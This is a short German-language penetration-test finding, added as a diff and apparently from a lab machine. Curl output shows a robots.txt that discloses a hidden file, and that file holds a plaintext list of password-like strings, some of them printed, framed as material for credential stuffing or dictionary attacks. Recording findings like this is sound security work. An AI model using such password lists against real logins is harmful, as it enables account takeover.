@@ -1,0 +1,36 @@
+=== FINDING: Information Disclosure — robots.txt & Passwortliste ===
+
+$ curl -sS http://10.10.10.10/robots.txt
+
+User-agent: *
+Disallow: 
+/decoda9013smith21985.txt
+/ThemeLoader.php
+
+---
+
+$ curl -sS http://10.10.10.10/decoda9013smith21985.txt | head -25
+
+Password Generator Prototype DB:
+
+eF"?$p+nYt2A#_Va
+U3#G?zgV"4jRu*N;
+U:#W7"F*9e{6L&SC
+f#kV;^8a6xmKD=@[
+YbL%XR@8aP:5tr~G
+Q*tZ^_9N3W=)7AzC
+m8CGAWT!>4a~/bp'
+n9z?=X%Kp$y6hY~4
+SE_RBd3(Cr7m%MFw
+vJk;Esq+cVx[(4Hy
+UBj!K@3zV(atTx6Q
+Z]Yy8$_s7e<hE[MG
+D9$GsdH[nvB+_p8C
+G'd}7BD5Rs(Z-Eh6
+u7{x"s*kY&JT`$8y
+aeJv,dx4&)PjhX'K
+WdSs[6hw9D-kyX/?
+yQ5<f$9N}(2RJD]x
+(... Liste mit hunderten Einträgen — Credential-Stuffing / Wörterbuchangriffe)
+
+Erkenntnis: robots.txt verrät sensitive Pfade; decoda-Datei ist eine große Klartext-Passwortsammlung.
